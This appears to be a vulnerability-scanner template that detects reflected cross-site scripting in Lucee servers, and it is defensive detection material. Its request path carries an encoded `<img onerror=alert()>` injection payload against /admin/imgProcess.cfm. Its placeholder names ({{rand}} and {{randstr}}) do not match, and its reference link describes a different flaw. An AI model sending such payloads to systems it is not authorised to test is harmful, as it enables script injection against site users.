id: "lucee-xss"
name: "Lucee - Cross-Site Scripting"
severity: "high"
description: "Lucee contains a cross-site scripting vulnerability. It allows remote attackers to inject arbitrary JavaScript into the responses returned by the server."
tech:
  - "generic"
tags:
  - "lucee"
  - "xss"
  - "unauth"
  - "intrusive"
  - "vuln"
reference: "https://www.acunetix.com/vulnerabilities/web/lucee-server-arbitrary-file-creation/"
spaExclusion: true
request:
  method: "GET"
  path: "/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{rand}}')%3elujb7/admin/imgProcess.cfm"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<img src=a onerror=alert('{{randstr}}')>"
      - "MissingIncludeException"
      - "lucee-err"
    condition: "and"
